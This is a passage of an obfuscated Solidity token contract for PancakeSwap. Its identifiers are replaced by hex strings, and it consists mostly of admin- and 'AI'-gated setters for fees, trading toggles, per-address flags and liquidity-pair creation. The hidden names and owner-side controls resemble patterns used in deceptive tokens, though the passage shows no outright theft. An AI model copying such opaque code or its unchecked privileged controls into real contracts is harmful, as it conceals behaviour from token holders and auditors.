_Oxb733761bdc55c4ad606df7f1ea85673983cb74d3671abbc2f8eda90fadd99a52035867acee76eb2480297f61cddeeae4be01284fc41588e5203c12400b6a8407) external onlyAI {Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox193bc2e3d520d000f97cb7aa3756c9bd6ad69586f091a692108f7a3bbda8eec6905c32747a3f026e79f08fb3fb8f4448f0502a2cd88543aadcc1b533b25a257d = _Ox193bc2e3d520d000f97cb7aa3756c9bd6ad69586f091a692108f7a3bbda8eec6905c32747a3f026e79f08fb3fb8f4448f0502a2cd88543aadcc1b533b25a257d;Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxa82526388298eb946c1519386d2ea42e558cca8d35df99a615ad184e5eac4600fb4c4f60d4d88fda427eb3d0bdd16fd11a331bb01151fa75b9f2ed34844cf640 = _Oxa82526388298eb946c1519386d2ea42e558cca8d35df99a615ad184e5eac4600fb4c4f60d4d88fda427eb3d0bdd16fd11a331bb01151fa75b9f2ed34844cf640;Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d = _Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d;Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxba4d4f1cc732b8d3c8fdbcb5e7287a442ac31a97c823059fd4342396812412abc669e9953cfdd5ef58b27c3dd0602d10e64b8d097253c47091de07bfba934bc7 = _Oxba4d4f1cc732b8d3c8fdbcb5e7287a442ac31a97c823059fd4342396812412abc669e9953cfdd5ef58b27c3dd0602d10e64b8d097253c47091de07bfba934bc7;Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxb733761bdc55c4ad606df7f1ea85673983cb74d3671abbc2f8eda90fadd99a52035867acee76eb2480297f61cddeeae4be01284fc41588e5203c12400b6a8407 = _Oxb733761bdc55c4ad606df7f1ea85673983cb74d3671abbc2f8eda90fadd99a52035867acee76eb2480297f61cddeeae4be01284fc41588e5203c12400b6a8407;}function Oxcce37db268bb4326a4fa4c88236d7501a9c6e0371f1ea2e7161898e3e0bb8d80176b8e485624de4219e683a00d29fbde735575f5e058808b587377ba8b7a9aee(bool Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9, bool Oxa7694167ae0274d6d92c7116a26d867f75d84b022e0760a190ea50f7b9e0dbdf1a7dc89e23e531185b59679bbf57bfc03da1069695a33ef34d4a9e56426c08ff, bool Ox68f46e3e991be92b878986f9d3efbc16a0c99d86086e9d7b4ceb8fd468b6104371aecc80f95541f6c49f980f39443efa1d528f5f484fa002259de0f29bee7eb4) external onlyAI {if(Ox68f46e3e991be92b878986f9d3efbc16a0c99d86086e9d7b4ceb8fd468b6104371aecc80f95541f6c49f980f39443efa1d528f5f484fa002259de0f29bee7eb4) Ox975a090b0c5b2fe79f93da624ad73e35cbf907ca52432db018325198c32f20254620cae25839cb278e7b006a112a952d985b21f616493f3c1d71d222f217b040 = block.timestamp;if (Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9) {Ox35d0e5f6d18ca25a20d28eaf977b9f372a611a7357e93fa6d7da9ef688751187a1be9f4a02b575e051d6c5488aa76de8df8c9e6286926c1d646da8d7161ae1a8 = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;Ox7663b6cb935b6748fe900e5ebe2ab0d1836f472a08f715ae5dcc83eace0b9ca8555abe274bbeda18491a88f145a658ba4c8ca72b0dd51d9691357b000f6d11b6 = block.timestamp;} else {Ox35d0e5f6d18ca25a20d28eaf977b9f372a611a7357e93fa6d7da9ef688751187a1be9f4a02b575e051d6c5488aa76de8df8c9e6286926c1d646da8d7161ae1a8 = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;}Oxdd65c71add8d31110845960c8917e55d8ffc5be16dda083b127618148ed0dafd846e59da613c4e11969927aa8086d053fd527c8d8767720c521caab402e6c76f = Oxa7694167ae0274d6d92c7116a26d867f75d84b022e0760a190ea50f7b9e0dbdf1a7dc89e23e531185b59679bbf57bfc03da1069695a33ef34d4a9e56426c08ff;}function manualSync(address Ox67f2d94545f464e3b96caacdd6f91b8e738f4e247d54aee7c5e79e3c9423bdf9f8eb00d1d018975f92ccca01a1dbdc15a462729645ae365bc7031e5bd70db425) external onlyAI {IPancakeSwapPair(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox67f2d94545f464e3b96caacdd6f91b8e738f4e247d54aee7c5e79e3c9423bdf9f8eb00d1d018975f92ccca01a1dbdc15a462729645ae365bc7031e5bd70db425].pairAddress).sync();}function Oxdea78fa5975af18e38ecd4d309862097f72d88f4814eedc2ad072920d900c2fce9c4a9f8a406accf8cf897c87205c4e92a0defc0138925d249a7101b4996d61e(bool value) external onlyAI {Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxe0260b87897456a7a34c013d22ae44ddb5e06bd3b23a4142b6d841d169bc38c62731fb0ff5f137302e53c89df68ec799079c155073c390524508d5b10577c247 = value;}function Ox907a8eb097b6aa974a01597be99899540db69ed1cfaf5117fa0ddc1d5462d38e2321c5f37e8bb69333d9640db1c3bb4d1e9ff35817a718a943014a6df9dd06cb(uint256 value) external onlyAI {Ox2137144dec0b7fed8619322f3295bd33873f72098513dcfbb6b0d8cd6b8f13fedde9f323ea33008281b572a8dc77436018412423fe579b086c5a7d83ea7d072a = value;}function Ox4fb2510cdffc6809b2e4c9fa71b0cc3d37a0807ec17e5e37473a3b1dae3dbb2d1f1435b6cefb3c91ee49c8874b98dfa02014ceadf624c20e77e39c7de664b3ff(uint256 index, uint256 value ) external onlyAI {Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b[index] = value;}function Ox391f46ebb153e1578376dea5c2cd7315edc997db0d6ca17ce7abf13b94427846190657cfc933f3decb16a6c3b676276b4938e5f1532caf3e6c7c8bf8a062c227(bool Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9) external onlyAI { Oxe2d41e1b80051323b970e338db05256bc38630ad3195caa4cefe435979e58a56416bcd4cdfabf720d065e0aadfe6a2f6690dc340e451eca63af2a25840cff94d = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;}function Ox02d2a51e2fd43e51b1af28f91bf6a8b29da23b905f36d4604e3663c122b14d903a3876d05334b0777b3a2b80541dff99652065e1e43098ee74741e1662e438cf(uint256 value) external onlyAI { Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox01fe15591c78b04342f4da119495ef4e6f14c11acc8fae7c4a96b943b9ec458794dc99b651dcee67c1f3cb3b3f6bcea44d67f1a25c6ab5ad07080b07779b6a2a = value;}function Ox715c4bd339140fa340b73c46a060b1752a80f002b8eb20e96bb32470877f3241550b797ae792c2528aa426ed2ca4ff38c172d0bf899333cdc6eb0cfb87dfcba8(uint256 value) external onlyAI { Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox9a0e019788dde2c1ebb143ffd89bb6b778c19e406198588d876c35c8e93cd7c95f742b17e42cad316992e4ececad8185978015b591e8aee77737bd4cd1396e8a = value;}function Ox55b6e01b49cad19eb18b2a8554722d85ae95035d646ec09c35735c1b0cc255798a1b3e2e2d8d8e411b148261e37a302fda69d57eace80a8300565f75774f218f(uint256 value) external onlyAI { Ox0403023a5a16c7a0d7904d6ee0366ad38a78594bce84104d00d882997f339be0104423324fab9f50932c2e65e2c79df6e80a948b90a3767e7d5bb16808739b0a = value;}function Ox29f065b4000a6acf0126eb4709c350522f4c39e472bbdb9a3662f9918d1d791f3445b433544e0052bdccf42df6e735160eccdb29a58a8a5e0e0a9b80acc85f98(address value) external onlyAI{Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e = value;}function Ox1700921686b58d5bfc3c05c76a10dfd00f0e87dbfbef8256208d3cd4c0b860b2deb4ee1dca8b50f1c6c81409b099eab5bffc3685c4be3a9805d730bbba357db5(uint256 _Ox4271961e9eedf5678bac682977725e2299d8e833199505b8c97e295e272938da511cd9748d21164a8dae795c21f69c0ec0a5e75c180f741e11f2cd52341933c3, uint256 _Ox2bb0f640b8e2d5bd0b1cac1bae18d8b6c2a2d7739caf071dc07ebf529eb493ca1658495b091b7b09ab6f3abad3a2827f4b3fa9f6b5c2d3a584b6be4cea5282f7) external onlyAI{Ox4271961e9eedf5678bac682977725e2299d8e833199505b8c97e295e272938da511cd9748d21164a8dae795c21f69c0ec0a5e75c180f741e11f2cd52341933c3 = _Ox4271961e9eedf5678bac682977725e2299d8e833199505b8c97e295e272938da511cd9748d21164a8dae795c21f69c0ec0a5e75c180f741e11f2cd52341933c3;Ox2bb0f640b8e2d5bd0b1cac1bae18d8b6c2a2d7739caf071dc07ebf529eb493ca1658495b091b7b09ab6f3abad3a2827f4b3fa9f6b5c2d3a584b6be4cea5282f7 = _Ox2bb0f640b8e2d5bd0b1cac1bae18d8b6c2a2d7739caf071dc07ebf529eb493ca1658495b091b7b09ab6f3abad3a2827f4b3fa9f6b5c2d3a584b6be4cea5282f7;}function Oxde0460789a8925ae558e0d6c12e122ae61b4903521b2063a7ad49d973b24e8f0ea1375f8f9777718bbbc3d06822454db8afce21ac1faa2d8f12cead7f1a8e71e(uint256 _Oxc21750d6477b3985f16b1c25c985685fa543c89d78f4408c923fb1137b1b79e5c806d3cccad81ca302e9f01b5e1c9d19331a792718a437ce8257807130fa6fbb, uint256 _Ox0092ac9010d14087f3aa54274c3a14387fd8e04d566eef44f6285317efc3efcbacc3acdb79423aa29bcf6f5ad2c3d14441f761e81904c8134dbf7bbb8f496707) external onlyAI { Oxc21750d6477b3985f16b1c25c985685fa543c89d78f4408c923fb1137b1b79e5c806d3cccad81ca302e9f01b5e1c9d19331a792718a437ce8257807130fa6fbb = _Oxc21750d6477b3985f16b1c25c985685fa543c89d78f4408c923fb1137b1b79e5c806d3cccad81ca302e9f01b5e1c9d19331a792718a437ce8257807130fa6fbb; Ox0092ac9010d14087f3aa54274c3a14387fd8e04d566eef44f6285317efc3efcbacc3acdb79423aa29bcf6f5ad2c3d14441f761e81904c8134dbf7bbb8f496707 = _Ox0092ac9010d14087f3aa54274c3a14387fd8e04d566eef44f6285317efc3efcbacc3acdb79423aa29bcf6f5ad2c3d14441f761e81904c8134dbf7bbb8f496707;}function Ox3818bdb0acef23b6cd11afd1faf970aee5dd27a486659ac1bb07c7a658e2e3d8351b1e3d1379beb7faf768d7b1d02ccc015e90d2229de8843fcbe4245f5134d4(uint256 index) external onlyAdmin{uint256 Oxa9de54b025d61c8da6f784250871f28b9bfb2b3eb79a0bc0bf3b703788d42271a5ba6131aa58e419ca20ff4cc7759d8c25b87c143991812042e28403a2f1069b;for(uint256 i; i<Ox8dc8e82471e29438c0ca37dd5e9c9b127f2d337aef0ae35da32407ea79b6f88a901e4a149243639a8c0ceaedc018e108f28061f926398359915ca428140bf09e-1; i++) {if(i == index) Oxa9de54b025d61c8da6f784250871f28b9bfb2b3eb79a0bc0bf3b703788d42271a5ba6131aa58e419ca20ff4cc7759d8c25b87c143991812042e28403a2f1069b++;poolList[i] = poolList[Oxa9de54b025d61c8da6f784250871f28b9bfb2b3eb79a0bc0bf3b703788d42271a5ba6131aa58e419ca20ff4cc7759d8c25b87c143991812042e28403a2f1069b];Oxa9de54b025d61c8da6f784250871f28b9bfb2b3eb79a0bc0bf3b703788d42271a5ba6131aa58e419ca20ff4cc7759d8c25b87c143991812042e28403a2f1069b++;}Ox8dc8e82471e29438c0ca37dd5e9c9b127f2d337aef0ae35da32407ea79b6f88a901e4a149243639a8c0ceaedc018e108f28061f926398359915ca428140bf09e--;}function Ox7ba53bd336799aa8ad87bd4bfe81dbc80386d930530323b26904126e3d7440b25599c3f54f5c3f1ff6dfbb0ccbd32b2aae0e1e416d1d0164fcbd53f2470d6d7a(uint256 _Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4, uint256 _sifFee, uint256 _Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761) external onlyAdmin {require(_Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 + _sifFee + _Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761 < 30, "Max3%");Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 = _Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4;Ox9f976ec4e0c100d174cb4a9d068dfb544bb836bc6613bea436fef95ea5db90d64f777517c5f6b72284d884fcf85692c32f440c8072497b07a3f82a74edfa3726 = _sifFee;Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761 = _Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761;Ox07fe5fa7813b29f37efc95b0ac50a921d508788507c00a0eeeeb94ac448977ee3bd892d5b4dea250b88c062aa56b75254954a6f4feb5020afc9ef8196d3f614f = Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 + Ox9f976ec4e0c100d174cb4a9d068dfb544bb836bc6613bea436fef95ea5db90d64f777517c5f6b72284d884fcf85692c32f440c8072497b07a3f82a74edfa3726 +  Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761;}function Oxfdc186ef1672739523ee1c15d42529487c6b73effcc3ad39dd160fd82ed7aa5043bedfa9e9245032ca1dfe4df0e63e0750467d66b3aaa6cff398cec77147a62a(address _Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0) external onlyAdmin {Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0 = _Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0;}function Ox06cbe8b5463c59d9a301ee1d96c187bdf0451068c3ca1f6dc7b296d99a7f8b2da35b9661aaf5e7fffbab0836531528fc87d8f3feb625f132be3bd4e768b05c4d(address _Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944, bool Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9) external onlyAdmin {Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox76999dd0fdcfa0d3916eefa176455e9430af5de4294d57f9df5f55ec9ceed41ee200b3288bcf9fa1fe8ae10f3e45d29b53877c52eefd47e495fe8bc564c003dd = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox56873814d5d92886d4306272973abf3a7aa09858124ab4281894b289960e10fbd734bee3c0458483de744e4d676d8affdce4075d7be7d9e924fe84a9253aaa67 = _Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944;}function Oxf2ac9700e6229feab58090073f9c99de56595a5da5f3f5487ef79cc748e9e020f23173e7b041fb4fd553fae50da747818224801e305e9c94792b2e045f48964f(address Ox99375b9d3b5b04e18c7f48d5ed370934c38957db3a297019ee37fe26874fb8e839e7ea38a436f5d3369450565606d81009e3231857d497a3e76ed57f90ee656b, bool Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9) external onlyAdmin {Oxf7980711b86977ba5e8d654647570bbd8c8d15c69b771871955c099a0adc23068683ae241fb17e5fe7fb7dd012faba896de9d52d469d66743a7d90b26aade0e7[Ox99375b9d3b5b04e18c7f48d5ed370934c38957db3a297019ee37fe26874fb8e839e7ea38a436f5d3369450565606d81009e3231857d497a3e76ed57f90ee656b] = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;}function Ox7973a1df256f417b9fcf57081227ab74b52b0a54a81805e5199cef8e5f944833b6bfa1c7ce6c2f55577b20775bf5e45117c372520e2243ef5cbee020e2c0f9e9(address _Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944, bool Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9) external onlyAdmin {require(Oxc5bab90642a6f1c73afe9ced493b2e6e9dce1ac90931af114e11627a6106ae5d51aa286adf6e9fec5dd37dd96a2f4756e35063e552fd2f28832a98883a854060(_Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944), "contract");Oxc6cb327aeadb2e38990524e0ca5bd04fb891b57b87b993040a6461ef94b3a38092080b6ef8a8b8bc54c106891bf971f8c7347b5ed9240f876214b0096d8af130[_Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944] = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;}function Ox65c97ee0114554c6a37e2a8ff61818d13900b279ec04ccc7d34e1ee63adc915e86177a21854b6f1231cd6748613c670014b6309be67c053b5459693b543e837d(address Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944,bool Ox998179d6fda4e4dc78b6cf8f407d69039ace19a8466104da55407da7bcd61f8a557358dba29ba7ab40e5b8499cd65c2665e60af93d5a3dec87efb1e8c885ec6d,bool Oxb2bf4b9c2d95bbe4e35d2ad2f9cc1c6d1262e206911b769aa446bec87a6b9b99ec8ef95310435d43edb1cb8d843466ad8d71846dc5779b55cb263ea38e2cdb19,pool memory _pool) external onlyAgent {if(Oxb2bf4b9c2d95bbe4e35d2ad2f9cc1c6d1262e206911b769aa446bec87a6b9b99ec8ef95310435d43edb1cb8d843466ad8d71846dc5779b55cb263ea38e2cdb19 || Ox998179d6fda4e4dc78b6cf8f407d69039ace19a8466104da55407da7bcd61f8a557358dba29ba7ab40e5b8499cd65c2665e60af93d5a3dec87efb1e8c885ec6d) require(Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944 != Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91, "Addr0");if(_pool.Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f == Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91) _pool.Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f = address(this);if(_pool.Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c == Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91) _pool.Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c = address(this);if(!Ox998179d6fda4e4dc78b6cf8f407d69039ace19a8466104da55407da7bcd61f8a557358dba29ba7ab40e5b8499cd65c2665e60af93d5a3dec87efb1e8c885ec6d && !Oxb2bf4b9c2d95bbe4e35d2ad2f9cc1c6d1262e206911b769aa446bec87a6b9b99ec8ef95310435d43edb1cb8d843466ad8d71846dc5779b55cb263ea38e2cdb19) {Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944 = IPancakeSwapFactory(Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.factory()).createPair(_pool.Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f,_pool.Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c);}if(Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944 == poolList[0]) {pairAddress = Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944;Oxf40c8b8eb4c8f9ba62daf8fae92b1a85e1c1fc94b0c0e03f6c98efe8a5b4372fc46193c9469304848bb09508908ce295f0ea1ca254052654ab997335ded7c827 = IPancakeSwapPair(Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944);}pool storage Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99 = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944];Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.pairAddress = Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxf40c8b8eb4c8f9ba62daf8fae92b1a85e1c1fc94b0c0e03f6c98efe8a5b4372fc46193c9469304848bb09508908ce295f0ea1ca254052654ab997335ded7c827 = IPancakeSwapPair(Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.pairAddress);Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0 = _pool.Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 = _pool.Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxf53b536f8f63a121f71a8464f904c96d4e525bae023cd62463aa5813869ef7d6475fc7f26e87b92590343771cb728d766190079a63f7985a111c0b22dd355e42 = _pool.Oxf53b536f8f63a121f71a8464f904c96d4e525bae023cd62463aa5813869ef7d6475fc7f26e87b92590343771cb728d766190079a63f7985a111c0b22dd355e42;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe = _pool.Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86 = _pool.Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox8408bfd8615b20256b2209b1e0a32f520187c0db537e303def568990210918b49e7c5a550b78ee45b687f66fa53847a472025fe25a4df28ba739df8e046bfcfd = 